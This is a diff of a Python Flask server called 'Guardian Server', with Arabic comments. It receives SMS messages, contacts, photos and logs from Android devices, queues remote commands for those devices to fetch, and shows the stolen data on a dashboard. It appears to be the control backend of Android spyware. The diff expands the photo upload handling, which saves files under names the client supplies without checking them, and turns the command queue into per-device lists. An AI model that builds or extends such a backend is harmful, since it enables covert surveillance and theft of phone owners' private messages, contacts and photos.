@@ -2,22 +2,9 @@
 Guardian Server - Python Flask Backend
 ========================================
 يستقبل البيانات من تطبيق Android ويعرضها في لوحة تحكم ويب جميلة.
-
-Endpoints:
-    POST /register   → تسجيل الجهاز
-    POST /sms        → استقبال الرسائل النصية
-    POST /contacts   → استقبال جهات الاتصال
-    POST /upload     → استقبال الصور (Base64)
-    POST /data       → استقبال بيانات عامة (أوامر)
-    GET  /           → لوحة التحكم الرئيسية
-    GET  /devices    → صفحة الأجهزة
-    GET  /messages   → صفحة الرسائل
-    GET  /contacts   → صفحة جهات الاتصال
-    GET  /photos     → صفحة الصور
-    GET  /send_command → إرسال أمر للجهاز
 """
 
-from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory
+from flask import Flask, request, jsonify, render_template, send_from_directory
 import json
 import os
 import base64
@@ -27,9 +14,9 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ══════════════════════════════════════════════
-#  قاعدة البيانات (ملفات JSON بسيطة)
+#  قاعدة البيانات
 # ══════════════════════════════════════════════
-DATA_DIR   = "data"
+DATA_DIR = "data"
 PHOTOS_DIR = os.path.join(DATA_DIR, "photos")
 os.makedirs(DATA_DIR, exist_ok=True)
 os.makedirs(PHOTOS_DIR, exist_ok=True)
@@ -38,7 +25,6 @@ os.makedirs(PHOTOS_DIR, exist_ok=True)
 @app.route("/static/photos/<filename>")
 def serve_photo(filename):
     return send_from_directory(PHOTOS_DIR, filename)
-
 
 def load_json(filename):
     path = os.path.join(DATA_DIR, filename)
@@ -56,7 +42,7 @@ def now():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 # ══════════════════════════════════════════════
-#  API Endpoints - استقبال البيانات من Android
+#  API Endpoints
 # ══════════════════════════════════════════════
 
 # ① تسجيل الجهاز
@@ -68,8 +54,6 @@ def register():
         data["ip"] = request.remote_addr
 
         devices = load_json("devices.json")
-
-        # تحديث الجهاز إذا كان موجوداً أو إضافته
         existing = next((d for d in devices if d.get("id") == data.get("id")), None)
         if existing:
             existing.update(data)
@@ -91,8 +75,8 @@ def receive_sms():
     try:
         data = request.get_json(force=True)
         sms_list = load_json("sms.json")
-
         messages = data.get("smsList", [])
+        
         for msg in messages:
             msg["device_ip"] = request.remote_addr
             msg["received_at"] = now()
@@ -111,8 +95,8 @@ def receive_contacts():
     try:
         data = request.get_json(force=True)
         contacts = load_json("contacts.json")
-
         new_contacts = data.get("data", [])
+        
         for c in new_contacts:
             c["device_ip"] = request.remote_addr
             c["received_at"] = now()
@@ -125,83 +109,83 @@ def receive_contacts():
         print(f"[!] Contacts error: {e}")
         return jsonify({"status": "error"}), 500
 
-# ④ استقبال الصور (Base64)
+# ④ استقبال الصور
 @app.route("/upload", methods=["POST"])
 def receive_photo():
     try:
-        data = request.get_json(force=True)
-        filename = data.get("filename", "photo.jpg")
-        file_b64 = data.get("file", "")
+        # دعم multipart/form-data
+        if request.content_type and 'multipart/form-data' in request.content_type:
+            if 'file' not in request.files:
+                return jsonify({"status": "error", "msg": "No file"}), 400
+                
+            file = request.files['file']
+            if file.filename == '':
+                return jsonify({"status": "error", "msg": "Empty filename"}), 400
+                
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            save_name = f"{timestamp}_{file.filename}"
+            photo_path = os.path.join(PHOTOS_DIR, save_name)
+            file.save(photo_path)
+            
+            photos = load_json("photos.json")
+            photos.append({
+                "filename": save_name,
+                "device_ip": request.remote_addr,
+                "received_at": now(),
+                "size": os.path.getsize(photo_path)
+            })
+            save_json("photos.json", photos)
+            
+            print(f"[+] Photo saved: {save_name}")
+            return jsonify({"status": "ok", "filename": save_name}), 200
+            
+        else:
+            # استقبال Base64
+            data = request.get_json(force=True)
+            filename = data.get("filename", "photo.jpg")
+            file_b64 = data.get("file", "")
+            
+            if not file_b64:
+                return jsonify({"status": "error", "msg": "No file data"}), 400
 
-        # حفظ الصورة
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        save_name = f"{timestamp}_{filename}"
-        photo_path = os.path.join(DATA_DIR, "photos", save_name)
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            save_name = f"{timestamp}_{filename}"
+            photo_path = os.path.join(PHOTOS_DIR, save_name)
 
-        with open(photo_path, "wb") as f:
-            f.write(base64.b64decode(file_b64))
+            with open(photo_path, "wb") as f:
+                f.write(base64.b64decode(file_b64))
 
-        # سجل الصور
-        photos = load_json("photos.json")
-        photos.append({
-            "filename": save_name,
-            "device_ip": request.remote_addr,
-            "received_at": now()
-        })
-        save_json("photos.json", photos)
+            photos = load_json("photos.json")
+            photos.append({
+                "filename": save_name,
+                "device_ip": request.remote_addr,
+                "received_at": now(),
+                "size": os.path.getsize(photo_path)
+            })
+            save_json("photos.json", photos)
 
-        print(f"[+] Photo saved: {save_name}")
-        return jsonify({"status": "ok"}), 200
+            print(f"[+] Photo saved: {save_name}")
+            return jsonify({"status": "ok"}), 200
+            
     except Exception as e:
         print(f"[!] Photo error: {e}")
-        return jsonify({"status": "error"}), 500
-
-# استقبال الصور كملف مضغوط (ZIP)
-@app.route("/upload_zip", methods=["POST"])
-def upload_zip():
-    try:
-        if 'file' not in request.files:
-            return jsonify({"status": "error", "message": "No file part"}), 400
-        
-        file = request.files['file']
-        if file.filename == '':
-            return jsonify({"status": "error", "message": "No selected file"}), 400
-            
-        zip_path = os.path.join(PHOTOS_DIR, "temp_gallery.zip")
-        file.save(zip_path)
-        
-        photos = load_json("photos.json")
-        extracted_count = 0
-        
-        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-            for zip_info in zip_ref.infolist():
-                if zip_info.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
-                    zip_ref.extract(zip_info, PHOTOS_DIR)
-                    
-                    entry = {
-                        "filename": zip_info.filename,
-                        "device_ip": request.remote_addr,
-                        "received_at": now()
-                    }
-                    photos.append(entry)
-                    extracted_count += 1
-                    print(f"[+] Extracted photo from ZIP: {zip_info.filename}")
-                    
-        save_json("photos.json", photos)
-        os.remove(zip_path)
-        
-        print(f"[+] Successfully extracted {extracted_count} photos from ZIP")
-        return jsonify({"status": "ok", "extracted": extracted_count}), 200
-        
-    except Exception as e:
-        print(f"[!] ZIP upload error: {e}")
-        return jsonify({"status": "error"}), 500
+        return jsonify({"status": "error", "msg": str(e)}), 500
 
 # ⑤ استقبال بيانات عامة
 @app.route("/data", methods=["POST"])
 def receive_data():
     try:
         data = request.get_json(force=True)
+        
+        if not data:
+            return jsonify({"status": "error", "msg": "No data"}), 400
+            
+        # معالجة السجلات الطويلة
+        if data.get("type") == "logs":
+            logs = data.get("logs", "")
+            if len(logs) > 50000:
+                data["logs"] = logs[:50000] + "\n... (مقطوع)"
+        
         data["device_ip"] = request.remote_addr
         data["received_at"] = now()
 
@@ -209,59 +193,69 @@ def receive_data():
         general.append(data)
         save_json("general.json", general)
 
-        print(f"[+] General data: {data.get('type', 'unknown')}")
+        print(f"[+] Data received: {data.get('type', 'unknown')}")
         return jsonify({"status": "ok"}), 200
     except Exception as e:
         print(f"[!] Data error: {e}")
-        return jsonify({"status": "error"}), 500
+        return jsonify({"status": "error", "msg": str(e)}), 500
 
-# ⑥ قائمة الأوامر المعلقة (Command Queue)
-# { "device_id": "command_string" }
+# ⑥ قائمة الأوامر المعلقة
 command_queue = {}
 
-# إرسال أمر لجهاز معين (من لوحة التحكم)
 @app.route("/send_command", methods=["POST"])
 def send_command():
     try:
         data = request.get_json(force=True)
         device_id = data.get("device_id", "all")
-        command   = data.get("command", "")
-        command_queue[device_id] = command
+        command = data.get("command", "")
+        
+        if not command:
+            return jsonify({"status": "error", "msg": "No command"}), 400
+            
+        if device_id not in command_queue:
+            command_queue[device_id] = []
+        command_queue[device_id].append(command)
+        
         print(f"[→] Command queued for {device_id}: {command}")
         return jsonify({"status": "ok", "command": command}), 200
     except Exception as e:
-        return jsonify({"status": "error"}), 500
+        print(f"[!] Send command error: {e}")
+        return jsonify({"status": "error", "msg": str(e)}), 500
 
-# الجهاز يسأل: هل عندي أمر؟ (Polling)
 @app.route("/command", methods=["GET"])
 def get_command():
     device_id = request.args.get("device_id", "")
-    # تحقق إذا في أمر مخصص لهذا الجهاز أو لكل الأجهزة
-    command = command_queue.pop(device_id, command_queue.pop("all", None))
-    if command:
+    
+    if device_id in command_queue and command_queue[device_id]:
+        command = command_queue[device_id].pop(0)
         print(f"[→] Sending command to {device_id}: {command}")
         return jsonify({"command": command}), 200
+    
+    if "all" in command_queue and command_queue["all"]:
+        command = command_queue["all"].pop(0)
+        print(f"[→] Sending broadcast command to {device_id}: {command}")
+        return jsonify({"command": command}), 200
+        
     return jsonify({"command": "none"}), 200
 
-
 # ══════════════════════════════════════════════
-#  Web Dashboard - لوحة التحكم
+#  Web Dashboard
 # ══════════════════════════════════════════════
 
 @app.route("/")
 def dashboard():
-    devices  = load_json("devices.json")
-    sms      = load_json("sms.json")
+    devices = load_json("devices.json")
+    sms = load_json("sms.json")
     contacts = load_json("contacts.json")
-    photos   = load_json("photos.json")
-    general  = load_json("general.json")
+    photos = load_json("photos.json")
+    general = load_json("general.json")
 
     stats = {
-        "devices":  len(devices),
-        "sms":      len(sms),
+        "devices": len(devices),
+        "sms": len(sms),
         "contacts": len(contacts),
-        "photos":   len(photos),
-        "data":     len(general),
+        "photos": len(photos),
+        "data": len(general),
     }
     return render_template("dashboard.html",
                            stats=stats,
@@ -276,15 +270,12 @@ def devices_page():
 @app.route("/messages")
 def messages_page():
     sms = load_json("sms.json")
-    
-    # تجميع الرسائل حسب رقم الهاتف
     grouped_sms = {}
     for msg in sms:
         phone = msg.get("phoneNo", msg.get("number", "غير معروف"))
         if phone not in grouped_sms:
             grouped_sms[phone] = []
         grouped_sms[phone].append(msg)
-        
     return render_template("messages.html", grouped_sms=grouped_sms, total_sms=len(sms))
 
 @app.route("/contacts_page")
@@ -303,16 +294,14 @@ def control_page():
     devices = load_json("devices.json")
     return render_template("control.html", devices=devices)
 
-# API لجلب الإحصائيات (AJAX)
 @app.route("/api/stats")
 def api_stats():
     return jsonify({
-        "devices":  len(load_json("devices.json")),
-        "sms":      len(load_json("sms.json")),
+        "devices": len(load_json("devices.json")),
+        "sms": len(load_json("sms.json")),
         "contacts": len(load_json("contacts.json")),
-        "photos":   len(load_json("photos.json")),
+        "photos": len(load_json("photos.json")),
     })
-
 
 # ══════════════════════════════════════════════
 #  تشغيل السيرفر
